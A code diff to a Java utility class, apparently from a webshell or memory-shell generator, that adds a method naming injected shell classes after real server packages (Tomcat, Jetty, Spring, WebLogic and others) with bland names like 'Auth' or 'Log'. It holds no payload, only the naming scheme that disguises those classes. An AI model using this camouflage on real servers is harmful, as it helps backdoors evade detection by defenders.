@@ -1,5 +1,7 @@
 package com.reajason.javaweb.util;
 
+import com.reajason.javaweb.config.Server;
+
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.security.SecureRandom;
@@ -23,6 +25,14 @@ public class CommonUtil {
             "org.apache.http.client",
             "com.google.gso",
             "ch.qos.logback"
+    };
+    private static final String[] MIDDLEWARE_NAMES = {
+            "Error",
+            "Log",
+            "Report",
+            "Auth",
+            "OAuth",
+            "Checker"
     };
 
     public static byte[] gzipCompress(byte[] data) throws IOException {
@@ -54,5 +64,23 @@ public class CommonUtil {
 
     public static String generateInjectorClassName() {
         return getRandomPackageName() + "." + INJECTOR_CLASS_NAMES[new Random().nextInt(INJECTOR_CLASS_NAMES.length)];
+    }
+
+    public static String generateShellClassName(Server server, String shellType) {
+        String packageName = switch (server) {
+            case Jetty -> "org.eclipse.jetty.servlet.handlers";
+            case Undertow, JBossEAP7, WildFly -> "io.undertow.servlet.handlers";
+            case SpringMVC -> "org.springframework.boot.mvc.handlers";
+            case SpringWebflux -> "org.springframework.boot.webflux.handlers";
+            case WebSphere -> "com.ibm.ws.webcontainer.handlers";
+            case WebLogic -> "weblogic.servlet.internal.handlers";
+            case Resin -> "com.caucho.server.dispatch.handlers";
+            default -> "org.apache.catalina.web.handlers";
+        };
+        return packageName
+                + "." + getRandomString(1)
+                + "." + getRandomString(1)
+                + "." + getRandomString(1)
+                + "." + MIDDLEWARE_NAMES[new Random().nextInt(MIDDLEWARE_NAMES.length)] + shellType;
     }
 }
